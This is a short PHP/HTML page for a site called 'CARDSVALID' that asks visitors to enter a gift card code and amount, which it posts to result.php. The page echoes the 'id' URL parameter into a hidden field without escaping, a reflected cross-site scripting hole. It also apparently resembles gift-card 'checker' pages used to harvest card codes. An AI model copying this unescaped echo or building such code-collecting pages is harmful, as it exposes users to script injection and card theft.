<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= 'title' ?></title>
    <!-- Include Tailwind CSS -->
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="asset/css/style.css">
</head>

<body>

    <?php require_once('nav.php') ?>

    <div class="flex justify-center">
        <main class=" page-content space-y-4">
            <div class="header text-center text-5xl pt-10 lg:pt-40">CARDSVALID</div>
            <p class="text-center pt-10">VALIDATE ALL GIFT CARD</p>

            <img src="./gift-card.png" alt="Website logo" class="mx-auto w-80">

            <div class="mb-4">
                <form action="./result.php" method="post" class="space-y-4">
                    <?php if(isset($_GET['id']) && !empty($_GET['id'])): ?>
                        <input type="hidden" name="id" value="<?= $_GET['id'] ?>">
                    <?php endif; ?>
                    
                    <div class="ff-el-group">
                        <div class="ff-el-input--content">
                            <input type="text" name="input_text" class="ff-el-form-control" placeholder="Gift card code" data-name="input_text" id="code" aria-invalid="false" aria-required="true">
                        </div>
                    </div>
                    <div class="ff-el-group">
                        <div class="ff-el-input--content"><input type="text" name="amount" class="ff-el-form-control" placeholder="Amount" data-name="amount" id="amount" aria-invalid="false" aria-required="false"></div>
                    </div>

                    <div class="flex justify-center">
                        <button type="submit" class="ff-btn ff-btn-submit ff-btn-md ff_btn_style">Verify Card</button>
                    </div>
                </form>
            </div>
        </main>
    </div>
</body>

</html>